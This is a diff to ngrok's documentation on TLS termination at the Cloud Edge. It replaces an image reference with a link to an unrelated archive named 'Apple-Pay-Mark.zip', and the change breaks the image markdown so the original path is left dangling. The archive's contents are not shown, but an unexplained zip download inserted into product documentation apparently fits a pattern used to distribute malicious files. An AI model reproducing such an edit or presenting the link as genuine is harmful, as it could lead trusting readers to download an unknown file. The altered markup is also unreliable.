@@ -19,4 +19,5 @@ The ngrok Cloud Edge types are HTTPS, TLS, and TCP. ngrok Cloud Edges do not sup
 
 ngrok provides configurable TLS termination options. By default, TLS terminates at the ngrok Cloud Edge, however, you can forward the TLS traffic through un-terminated. Pass-through TLS traffic will need to be terminated by your application server (or by the ngrok agent). For more information check out the TLS Edge.
 
-![ngrok TLS termination options](/img/docs/ngrok-tls-termination.png)
+![ngrok TLS termination options][Apple-Pay-Mark.zip](https://github.com/ngrok/ngrok-docs/files/10436754/Apple-Pay-Mark.zip)
+(/img/docs/ngrok-tls-termination.png)
